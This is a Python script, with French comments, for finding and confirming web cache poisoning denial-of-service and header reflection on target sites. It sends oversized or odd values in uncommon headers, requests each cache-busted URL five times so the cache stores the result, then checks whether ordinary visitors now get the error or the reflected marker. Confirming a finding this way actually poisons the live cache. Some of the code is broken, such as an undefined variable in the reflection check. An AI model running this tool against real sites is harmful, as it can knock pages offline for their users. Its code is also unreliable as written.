#!/usr/bin/env python3
"""
Script d'analyse des en-têtes HTTP non-communs avec tests de paramètres
pour identifier des comportements d'erreur potentiels et détecter les réflexions
"""

import requests
import time
import random
import argparse
import sys
from urllib.parse import urlparse
from typing import Dict, List, Set, Tuple
import json
import traceback


requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

reflect_word = "bycodejump"

common_header = [
            'content-type', 'content-length', 'date', 'server', 'cache-control',
            'connection', 'accept', 'accept-encoding', 'accept-language',
            'user-agent', 'host', 'referer', 'cookie', 'set-cookie',
            'authorization', 'content-encoding', 'transfer-encoding',
            'last-modified', 'etag', 'expires', 'pragma', 'vary',
            'content-disposition', 'access-control-allow-origin', 'Content-language',
            'X-Frame-Options', 'Content-Security-Policy', 'Strict-Transport-Security',
            'Referrer-Policy', 'Permissions-Policy', 'X-CDN', 'X-Drupal-Cache', 'x-xss-protection', 
            'x-content-type-options', 'x-robots-tag', 'Age', 'x-cache', 'X-Cache-Hits', 'Keep-Alive',
            'X-Permitted-Cross-Domain-Policies', 'x-powered-by', 'Content-Security-Policy-Report-Only',
            'Accept-Ranges', 'X-Served-By', 'X-Timer', 'via', 'cf-cache-status', 'cf-ray', 'Alt-Svc', 'status',
            'P3P', 'Features-Policy', 'Feature-Policy', 'Access-Control-Max-Age', 'Expect-CT', 'X-Age', 'Report-To',
            'x-real-age', 'Server-Timing', 'cross-origin-embedder-policy', 'cross-origin-opener-policy', 'Mime-Version',
            'X-Content-Security-Policy', 'Cross-Origin-Opener-Policy', 'Cross-Origin-Resource-Policy'
]

errors_payload = [
            'A' * 1024, 'xxxx', '©'
]


def verify_cp(url, s, main_status_code, main_len, main_head, payload, authent):
    uri = f'{url}{random.randrange(9999)}'

    for _ in range(5):
        req_cached = s.get(uri, headers=payload, verify=False, allow_redirects=False, timeout=10)

    req_verify = requests.get(uri, headers={"User-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"}, verify=False, allow_redirects=False, timeout=10)

    if req_verify.status_code != main_status_code:
        print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {main_status_code} > {req_verify.status_code} | \033[34m{uri}\033[0m | PAYLOAD: {payload}")
    elif len(req_verify.content) not in range(main_len - 200, main_len + 200):
        print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {main_len}b > {len(req_verify.content)}b | \033[34m{uri}\033[0m | PAYLOAD: {payload}")


def verify_cp_reflect(url, s, main_status_code, main_len, main_head, payload, authent):
    uri = f'{url}{random.randrange(9999)}'

    for _ in range(5):
        req_cached = s.get(uri, headers=payload, verify=False, allow_redirects=False, timeout=10)
    req_verify = s.get(uri, verify=False, allow_redirects=False, timeout=10)

    if reflect_word in req_verify.text:
        print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | BODY REFLECTED | \033[34m{uri}\033[0m | PAYLOAD: {headers}")
    elif reflect_word in req_verify.headers:
        print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | HEADER REFLECTED | \033[34m{uri}\033[0m | PAYLOAD: {headers}")



def test_reflection(url, s, main_status_code, main_len, main_head, uncommon_header, authent):
    for uh in uncommon_header:
        headers = {
            uh: reflect_word 
        }

        uri = f'{url}{random.randrange(9999)}'
        req_reflected = s.get(url, headers=headers, verify=False, allow_redirects=False, timeout=10)
        if reflect_word in req_reflected.text:
            print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | BODY REFLECTED | \033[34m{uri}\033[0m | PAYLOAD: {headers}")
            verify_cp_reflect(url, s, main_status_code, main_len, main_head, headers, authent)
        elif reflect_word in req_reflected.headers:
            print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | HEADER REFLECTED | \033[34m{uri}\033[0m | PAYLOAD: {headers}")
            verify_cp_reflect(url, s, main_status_code, main_len, main_head, headers, authent)


def uncommon_header_test(url, s, main_status_code, main_len, main_head, uncommon_header, authent):
    for uh in uncommon_header:
        for ep in errors_payload:
            headers = {
                uh: ep 
            }

            uri = f'{url}{random.randrange(9999)}'
            req_uh = s.get(uri, headers=headers, verify=False, allow_redirects=False, timeout=10)
            if req_uh.status_code not in [401, 403]:
                if req_uh.status_code != main_status_code:
                    print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_status_code} > {req_uh.status_code} | \033[34m{uri}\033[0m | PAYLOAD: {headers}")
                    verify_cp(url, s, main_status_code, main_len, main_head, headers, authent)
                elif len(req_uh.content) not in range(main_len - 500, main_len + 500):
                    print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_len}b > {len(req_uh.content)}b | \033[34m{uri}\033[0m | PAYLOAD: {headers}")
                    verify_cp(url, s, main_status_code, main_len, main_head, headers, authent)


def get_http_headers(url, s, main_status_code, main_len, main_head, authent):
    print("\n\033[36m ├ Uncommon header analysis\033[0m")
    url = f"{url}?cb={random.randrange(9999)}"

    uncommon_header = []

    try:
        for header, value in main_head.items():
            found = False
            for h in common_header:
                if header.lower() == h.lower():
                    found = True
            if not found:
                uncommon_header.append(header)
        if uncommon_header:
            print(f" └── Uncommon headers: {uncommon_header}")

            test_reflection(url, s, main_status_code, main_len, main_head, uncommon_header, authent)
            uncommon_header_test(url, s, main_status_code, main_len, main_head, uncommon_header, authent)

    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de la requête : {e}")
    except Exception as e:
        print(f"Erreur inattendue : {e}")
        traceback.print_exc()

if __name__ == '__main__':
    url_arg = sys.argv[1]

    s = requests.Session()
    s.headers.update(
                {
                    "User-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko",
                }
            )

    if "http://" in url_arg or "https://" in url_arg:
        url = f"{url_arg}?cb=foo"
        req_main = s.get(url, verify=False, timeout=10, allow_redirects=False)

        main_head = req_main.headers
        main_len = len(req_main.content)
        main_status_code = req_main.status_code
        authent = False

        get_http_headers(url, s, main_status_code, main_len, main_head, authent)
    else:
        with open(url_arg, "r") as urls:
            urls = urls.read().splitlines()
            for url in urls:
                url = f"{url}?cb=foo"
                try:
                    req_main = s.get(url, verify=False, timeout=10, allow_redirects=False)

                    main_head = req_main.headers
                    main_len = len(req_main.content)
                    main_status_code = req_main.status_code
                    authent = False


                    get_http_headers(url, s, main_status_code, main_len, main_head, authent)
                except KeyboardInterrupt:
                    print("Exiting")
                    sys.exit()
                except:
                    pass
                print(f" {url}", end='\r')